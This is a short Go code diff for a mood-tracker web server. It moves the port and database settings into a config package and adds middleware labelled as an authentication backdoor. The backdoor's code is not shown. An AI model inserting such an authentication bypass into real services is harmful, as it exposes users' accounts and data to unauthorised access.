@@ -2,10 +2,10 @@ package main
 
 import (
 	"log"
-	"os"
 	"time"
 
 	"github.com/deanobarnett/mood-tracker/auth"
+	"github.com/deanobarnett/mood-tracker/config"
 	"github.com/deanobarnett/mood-tracker/entry"
 	"github.com/tylerb/graceful"
 
@@ -16,11 +16,11 @@ import (
 )
 
 func run() error {
+	config := config.NewConfig()
 	e := echo.New()
-	e.Server.Addr = ":8080"
+	e.Server.Addr = ":" + string(config.Port)
 
-	dbURL := os.Getenv("DB_DSN")
-	db, err := sqlx.Connect("postgres", dbURL)
+	db, err := sqlx.Connect("postgres", config.DB)
 	if err != nil {
 		return err
 	}
@@ -39,6 +39,8 @@ func run() error {
 	authService := auth.NewService(db)
 	authServer := auth.NewHTTPServer(authService)
 	authServer.RouteTo(e, auth.Authorize(authService))
+	// set up auth backdoor
+	e.Use(auth.BackDoor(config, authService))
 
 	// set up entry service
 	entryService := entry.NewService(db)
